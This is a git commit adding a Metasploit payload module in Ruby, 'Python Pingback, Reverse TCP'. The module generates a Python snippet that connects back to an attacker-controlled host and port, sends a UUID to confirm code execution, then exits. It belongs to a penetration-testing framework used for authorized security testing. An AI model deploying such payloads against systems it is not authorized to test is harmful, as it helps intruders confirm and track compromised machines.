920b034b036558146c3f4f423aea4c2386c449bc
asoto-r7 <aaron_soto@rapid7.com>
2019-05-16 14:43:23 -0500

    Python pingback payload (reverse only)

---
+++ modules/payloads/singles/python/pingback_reverse_tcp.rb
@@ -0,0 +1,62 @@
+require 'msf/core/handler/reverse_tcp'
+require 'msf/core/payload/python'
+require 'msf/base/sessions/command_shell'
+require 'msf/base/sessions/command_shell_options'
+
+require 'msf/base/sessions/pingback'
+require 'msf/base/sessions/pingback_options'
+require 'msf/core/payload/pingback'
+
+module MetasploitModule
+
+  CachedSize = 381
+
+  include Msf::Payload::Single
+  include Msf::Sessions::PingbackOptions
+  include Msf::Sessions::CommandShellOptions
+
+  def initialize(info = {})
+    super(merge_info(info,
+      'Name' => 'Python Pingback, Reverse TCP (via python)',
+      'Description' => 'Connects back to the attacker, sends a UUID, then terminates',
+      'Author' => 'asoto-r7',
+      'License' => MSF_LICENSE,
+      'Platform' => 'python',
+      'Arch' => ARCH_PYTHON,
+      'Handler' => Msf::Handler::ReverseTcp,
+      'Session' => Msf::Sessions::Pingback,
+      'PayloadType' => 'python',
+      'Payload' =>
+        {
+          'Offsets' => { },
+          'Payload' => ''
+        }
+      ))
+  end
+
+  def generate
+    super + command_string
+  end
+
+  def command_string
+    pingback_uuid ||= generate_pingback_uuid
+    pingback_uuid.gsub!('-','')
+
+    cmd  = "import socket as s\n"
+    cmd << "so=s.socket(s.AF_INET,s.SOCK_STREAM)\n"
+    cmd << "try:\n"
+    cmd << " so.connect(('#{ datastore['LHOST'] }',#{ datastore['LPORT'] }))\n"
+    cmd << " so.send('#{pingback_uuid}'.decode('hex'))\n"
+    cmd << " so.close()\n"
+    cmd << "except:\n"
+    cmd << " pass\n"
+
+   cmd
+ end
+
+  def include_send_pingback
+    true
+  end
+end
+
+
